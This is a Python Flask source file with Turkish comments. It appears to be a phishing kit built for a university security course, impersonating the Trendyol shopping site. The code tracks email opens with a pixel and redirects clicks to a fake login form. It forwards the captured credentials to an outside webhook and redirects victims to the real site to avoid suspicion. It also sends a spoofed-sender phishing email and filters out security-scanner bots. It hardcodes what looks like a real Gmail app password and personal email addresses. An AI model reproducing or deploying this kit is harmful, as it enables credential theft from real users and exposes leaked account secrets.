from flask import Flask, request, redirect, Response
from flask_cors import CORS
import time
import json
import requests
import logging
# SMTPLIB ile mail gönderme için yeni importlar
import smtplib 
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText 
# Diğer modüllere gerek kalmadı

# Loglama ayarlarını yapılandırma
logging.basicConfig(filename='app.log', level=logging.INFO, format='%(asctime)s %(levelname)s:%(message)s')

app = Flask(__name__)
# Tüm kaynaklardan gelen isteklere izin verir (CORS çözümü)
CORS(app, resources={r"/*": {"origins": "*"}}) 

LOG_FILE = 'tracking_log.txt'
TARGET_TRENDYOL_URL = "https://www.trendyol.com/" 
TARGET_WEBHOOK_URL = "https://webhook.site/ddffa832-be0c-4854-9578-fb0fe971e020" # SİZİN WEBHOOK ADRESİNİZ
PHISHING_FORM_NETLIFY_URL = "https://cozy-salamander-8df772.netlify.app/index.html" # SİZİN NETLIFY ADRESİNİZ

# --- SMTP AYARLARI (KENDİ BİLGİLERİNİZLE DEĞİŞTİRİN) ---
SENDER_EMAIL = 'efeakgul.cs437@gmail.com' 
SENDER_PASS = 'vezc uhvb itzc xnvg' # LÜTFEN YENİ ŞİFRENİZİ BURAYA GİRİN
RECIPIENT_EMAIL = 'baris.kaplan@sabanciuniv.edu' # Hocanın mail adresi
PHISHING_SENDER_NAME = 'Trendway Güvenlik' 

# Güvenlik Botu User-Agent Anahtar Kelimeleri
BOT_AGENTS = [
    "GoogleImageProxy", 
    "Microsoft Defender SmartScreen", 
    "Cisco IronPort", 
    "Barracuda", 
    "Proofpoint URL Defense"
]

# --- Loglama ve Analiz Fonksiyonları ---

def log_event(event_type, status, user_agent, ip_addr, data=""):
    """İzleme verilerini dosyaya kaydeder."""
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
    log_entry = {
        "timestamp": timestamp,
        "event_type": event_type,
        "status": status,
        "ip": ip_addr,
        "user_agent": user_agent,
        "data": data,
    }
    print(json.dumps(log_entry))
    with open(LOG_FILE, 'a') as f:
        f.write(json.dumps(log_entry) + '\n')

def analyze_request(user_agent, event_type):
    """User-Agent'a göre Bot/İnsan ayrımı yapar."""
    ua_lower = user_agent.lower()
    for bot_keyword in BOT_AGENTS:
        if bot_keyword.lower() in ua_lower:
            return "Provider Scan / Security Bot"
    
    if "chrome" in ua_lower or "safari" in ua_lower or "firefox" in ua_lower or "edge" in ua_lower:
         return "Real Human Click"
         
    return "Unknown/Normal Click"

# --- Endpointler ---

@app.route('/track')
def track_pixel():
    """E-posta açılışını izleyen görünmez piksel."""
    user_agent = request.headers.get('User-Agent', 'N/A')
    ip_addr = request.remote_addr
    
    status = analyze_request(user_agent, "open")
    log_event("Email Open", status, user_agent, ip_addr)
    
    # 1x1 piksel transparan GIF döndür
    pixel = b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b'
    return Response(pixel, mimetype='image/gif')


@app.route('/click', methods=['GET'])
def track_click_and_redirect_to_form():
    """Linke tıklamayı izler ve kurbanı Netlify'daki forma yönlendirir."""
    user_agent = request.headers.get('User-Agent', 'N/A')
    ip_addr = request.remote_addr
    
    status = analyze_request(user_agent, "click_to_form") 
    
    # Tıklamayı Logla ve Bot/İnsan Analizi Yap
    log_event("Link Clicked (Pre-Form)", status, user_agent, ip_addr, data=json.dumps(request.args.to_dict()))

    # Kurbanı Netlify'daki sahte giriş formuna yönlendir
    return redirect(PHISHING_FORM_NETLIFY_URL)


@app.route('/capture', methods=['POST'])
def capture_credentials():
    """Formdan gelen kimlik bilgilerini yakalar, Webhook'a iletir ve Trendyol'a yönlendirir."""
    
    user_agent = request.headers.get('User-Agent', 'N/A')
    ip_addr = request.remote_addr
    form_data = request.form.to_dict() 
    
    # 1. Analiz ve Loglama
    status = analyze_request(user_agent, "capture")
    log_event("Credentials Captured", status, user_agent, ip_addr, data=json.dumps(form_data))

    # 2. Webhook'a İletim (Kalici kayıt için)
    try:
        requests.post(TARGET_WEBHOOK_URL, data=form_data)
    except requests.exceptions.RequestException as e:
        logging.error(f"Webhook error: {e}")

    # 3. Kurbanı Hemen Gerçek Siteye Yönlendirme (OpSec)
    return redirect(TARGET_TRENDYOL_URL) 


# --- SMTP Gönderme Fonksiyonu (SMTPLIB) ---

# tracker.py dosyasındaki send_mail fonksiyonunu bulun ve değiştirin:

def send_mail(recipient, html_content):
    """HTML içeriğini SMTPLIB ile, Görünen Ad taklidi denemesiyle gönderir."""
    
    # MIME formatında mesajı oluştur
    msg = MIMEMultipart('alternative')
    
    # RFC uyumlu format: "Görünen Ad <E-posta Adresi>"
    # Bu formatı hem 'From' başlığına hem de sendmail fonksiyonuna gönderiyoruz.
    SENDER_FULL_NAME = f'{PHISHING_SENDER_NAME} <{SENDER_EMAIL}>'

    # 1. Başlıklara taklit edilen adı ekle
    msg['From'] = SENDER_FULL_NAME 
    msg['To'] = recipient
    msg['Subject'] = 'BARIŞ SERHAT KAPLAN - ACİL: Hesap Güvenliğiniz İçin Doğrulama Gerekiyor'
    
    msg.attach(MIMEText(html_content, 'html'))
    
    try:
        # SMTP sunucusuna bağlan
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.ehlo()
        server.login(SENDER_EMAIL, SENDER_PASS)
        
        # 2. KRİTİK: Maili gönderirken Görünen Adı (Taklit edilen adresi) kullan
        # Ancak sendmail'in ilk argümanı, SMTP oturum açma kimliği olmalıdır (SENDER_EMAIL)
        # Bu, Gmail'in kısıtlaması nedeniyle genellikle başarısız olur.
        server.sendmail(SENDER_EMAIL, recipient, msg.as_string()) 
        
        server.quit()
        
        # Başarılı loglaması, taklidin çalışıp çalışmadığını göstermez, sadece mailin iletildiğini gösterir.
        print(f"\n[SMTP/SMTPLIB] Mail başarıyla {recipient} adresine gönderildi.")
    except smtplib.SMTPDataError as e:
        print(f"\n[SMTP/SMTPLIB HATASI] Gönderim reddedildi (Data Hatası): {e}")
        print("BÜYÜK İHTİMALLE GMAIL TAKLİTİ ENGELEDİ.")
    except Exception as e:
        print(f"\n[SMTP/SMTPLIB HATASI] Mail gönderme başarısız: {e}")


if __name__ == '__main__':
    # Log dosyasını temizleyin
    with open(LOG_FILE, 'w') as f:
        f.write("--- Phishing Tracker Log Start ---\n")
    
    # --- MAİL GÖNDERME İŞLEMİ (Tek Seferlik) ---
    try:
        with open("trendway_mail_gonderim.html", "r", encoding="utf-8") as f:
            html_content = f.read()
        send_mail(RECIPIENT_EMAIL, html_content)
    except FileNotFoundError:
        print("\n[HATA] 'trendway_mail_gonderim.html' dosyası bulunamadı. Mail gönderilmedi.")
    
    # --- FLASK SUNUCUSUNU BAŞLATMA ---
    app.run(host='0.0.0.0', port=5000, debug=False)